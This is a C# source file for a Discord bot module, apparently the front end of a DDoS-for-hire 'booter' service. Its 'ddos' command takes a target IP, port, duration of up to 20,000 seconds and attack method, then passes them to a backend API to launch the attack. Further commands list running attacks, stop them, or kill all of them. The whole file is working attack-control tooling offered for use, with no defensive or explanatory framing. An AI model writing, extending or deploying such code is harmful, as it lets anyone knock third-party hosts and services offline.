using System.Threading.Tasks;
using Discord.Commands;
using System.Net;
using System.IO;
using System;

namespace ConsoleApp1.Modules
{
    public class ddos : ModuleBase<SocketCommandContext>
    {
        [Command("ddos")]
        public async Task DDOSAsync(string IP = "Empty",string PORT = "Empty", double TIME = 0, string method = "Empty")
        {

            if (IP == "Empty" || TIME == 0 || PORT == "Empty" ||  method == "Empty")
            {
                await ReplyAsync("Invalid Usage: d!ddos 1.3.3.7 80 60 [VPN/HOME]");
            }
            else
            {
                if (TIME < 20001)
                {
                    string sURL;
                    string username = Context.Guild.GetUser(Context.User.Id).Username;
                    sURL = "http://127.0.0.1/api.php?target=" + IP + "&time=" + TIME + "&port=" + PORT + "&method="+method+"&username=" + username + "&action=ON";
                    WebRequest wrGETURL;
                    wrGETURL = WebRequest.Create(sURL);
                    Stream objStream;
                    objStream = wrGETURL.GetResponse().GetResponseStream();
                    StreamReader objReader = new StreamReader(objStream);
                    HttpWebResponse response = (HttpWebResponse)wrGETURL.GetResponse();
                    Stream dataStream = response.GetResponseStream();
                    StreamReader reader = new StreamReader(dataStream);
                    string responseFromServer = reader.ReadToEnd();
                    await ReplyAsync(responseFromServer);
                    Console.Write("Attack sent to " + IP+"\n");
                    
                }
                if (TIME > 20001)
                {
                    await ReplyAsync("Remember the Max Time Limit is 20,000!.\nYou used : "+TIME);
                }


            } 

        }

        [Command("running")]
        public async Task runningAsync(string target = "Empty")
        {
            if (target == "Empty")
            {
                await ReplyAsync("Invalid Usage: d!running Name");
            }
            else
            {
                string sURL;
                sURL = "http://127.0.0.1/attacks.php?target=" + target;
                WebRequest wrGETURL;
                wrGETURL = WebRequest.Create(sURL);
                Stream objStream;
                objStream = wrGETURL.GetResponse().GetResponseStream();
                StreamReader objReader = new StreamReader(objStream);
                HttpWebResponse response = (HttpWebResponse)wrGETURL.GetResponse();
                Stream dataStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataStream);
                string responseFromServer = reader.ReadToEnd();
                await ReplyAsync(target+" Attacks running : "+responseFromServer);
            }
        }

        [Command("ddosstop")]
        public async Task PingAsync2([Remainder]string IP = "Empty")
        {
            if (IP == "Empty")
            {
                await ReplyAsync("Invalid Usage: d!ddosstop 1.3.3.7");
            }
            else
            {
                string sURL;
                sURL = "http://127.0.0.1/api.php?username=" + IP+"&action=OFF";
                WebRequest wrGETURL;
                wrGETURL = WebRequest.Create(sURL);
                Stream objStream;
                objStream = wrGETURL.GetResponse().GetResponseStream();
                StreamReader objReader = new StreamReader(objStream);
                HttpWebResponse response = (HttpWebResponse)wrGETURL.GetResponse();
                Stream dataStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataStream);
                string responseFromServer = reader.ReadToEnd();
                await ReplyAsync(responseFromServer +" Attacks Running");
            }
        }

        [Command("killall")]
        public async Task KillAsync()
        {
                string sURL;
                sURL = "http://127.0.0.1/api.php?&action=SAVE";
                WebRequest wrGETURL;
                wrGETURL = WebRequest.Create(sURL);
                Stream objStream;
                objStream = wrGETURL.GetResponse().GetResponseStream();
                StreamReader objReader = new StreamReader(objStream);
                HttpWebResponse response = (HttpWebResponse)wrGETURL.GetResponse();
                Stream dataStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataStream);
                string responseFromServer = reader.ReadToEnd();
                await ReplyAsync(responseFromServer);
        }

        }
    }
